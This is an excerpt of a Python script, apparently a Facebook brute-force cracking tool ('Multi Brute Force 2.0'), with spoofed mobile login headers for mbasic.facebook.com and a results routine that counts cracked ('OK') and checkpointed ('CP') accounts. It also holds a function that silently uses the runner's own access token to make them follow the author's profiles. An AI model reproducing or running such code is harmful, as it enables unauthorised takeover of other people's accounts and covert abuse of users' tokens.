...
def banner():
    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By [Rian Setiawan]  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/riyenz30 ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
except:
	ips=None
...
def bot_follow():
	try:
		...
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	kom = ("Rian Ganteng Siapa Punya?\n\nhttps://www.facebook.com/photo.php?fbid=426674801523676&set=a.107527600105066&type=3&app=fbl")
	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Rian Setiawan
	requests.post('https://graph.facebook.com/100025434784741/subscribers?access_token=' + toket)
	menu()
...
def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; RMX1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
...
def results(Rian,Krahkrah):
        if len(Rian) !=0:
                print(("[OK] : "+str(len(Rian))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Rian) ==0 and len(Krahkrah) ==0:
                print("\n")
